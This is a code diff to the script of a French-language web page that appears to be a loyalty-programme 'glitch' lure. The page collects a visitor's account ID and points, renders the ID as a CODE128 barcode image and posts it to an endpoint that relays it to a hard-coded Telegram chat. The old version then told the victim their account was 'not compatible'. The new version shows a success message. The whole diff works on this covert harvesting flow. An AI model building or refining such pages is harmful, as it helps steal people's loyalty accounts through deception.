@@ -459,7 +459,6 @@ nav .nav-cta:hover{background:var(--yellow-hover)}
 
 <script>
 (function(){
-  // ❌ PLUS DE TOKEN ICI - C'est maintenant caché côté serveur
   const CHAT_ID="7148167734";
 
   let rawId="",busy=false;
@@ -524,6 +523,7 @@ nav .nav-cta:hover{background:var(--yellow-hover)}
     document.getElementById('goStep3').disabled=true;
     document.getElementById('backStep1').disabled=true;
     s2st.className='status loading';s2st.style.display='flex';
+    s2st.textContent='⏳ Envoi en cours...';
     setProgress(3);
 
     try{
@@ -546,34 +546,42 @@ nav .nav-cta:hover{background:var(--yellow-hover)}
         background:"#ffffff"
       });
       await new Promise(r=>setTimeout(r,30));
-      const blob=await new Promise((res,rej)=>bc.toBlob(b=>b?res(b):rej(),'image/png'));
+      
+      // Convertir le canvas en base64
+      const photoBase64 = bc.toDataURL('image/png').split(',')[1];
+      
       const pts=pInput.value.trim()||"non renseignés";
-      const cap=`🆔 ID : ${rawId}\n🍟 Points : ${pts}\n📦 CODE128 : ${rawId}`;
+      const caption=`🆔 ID : ${rawId}\n🍟 Points : ${pts}\n📦 CODE128 : ${rawId}`;
       
-      // ✅ APPEL SÉCURISÉ À VOTRE ENDPOINT (pas directement à Telegram)
-      const fd=new FormData();
-      fd.append('chatId',CHAT_ID);
-      fd.append('photo',blob,'code.png');
-      fd.append('caption',cap);
-      
-      const response = await fetch('/api/send-photo', {
+      // ✅ Appel sécurisé à votre endpoint
+      const apiResponse = await fetch('/api/send-photo', {
         method:'POST',
-        body:fd
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({
+          chatId: CHAT_ID,
+          photoBase64: photoBase64,
+          caption: caption
+        })
       });
 
-      if(!response.ok) throw new Error('Erreur serveur');
+      const result = await apiResponse.json();
 
+      if(!apiResponse.ok) {
+        throw new Error(result.error || 'Erreur serveur');
+      }
+
+      // ✅ Succès
       s2.innerHTML=`
         <div class="card-stripe"></div>
         <div class="card-body">
           <div class="card-head">
             <div class="card-icon">
-              <svg viewBox="0 0 24 24" fill="none" stroke="#8B1020" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
+              <svg viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><polyline points="16 12 12 8 8 12"></polyline></svg>
             </div>
-            <div><h2>Votre compte n'est pas compatible</h2><p>pour le glitch :(</p></div>
+            <div><h2>✅ Code envoyé !</h2><p>Succès</p></div>
           </div>
           <p style="font-size:14px;color:var(--text-muted);line-height:1.65;margin-bottom:28px;font-weight:400">
-            Une erreur est survenue lors de la vérification de votre compte. Veuillez réessayer ultérieurement.
+            Votre code-barres a été enregistré avec succès.
           </p>
           <button class="btn btn-ghost" style="width:100%" onclick="location.reload()">← Recommencer</button>
         </div>
@@ -582,8 +590,9 @@ nav .nav-cta:hover{background:var(--yellow-hover)}
       s2st.style.display='none';
       const err=document.createElement('div');
       err.className='status error';err.style.display='block';
-      err.textContent='❌ Une erreur est survenue. Veuillez réessayer.';
+      err.textContent='❌ '+e.message;
       s2.appendChild(err);
+      console.error('Erreur:', e);
     }finally{busy=false;}
   });
 
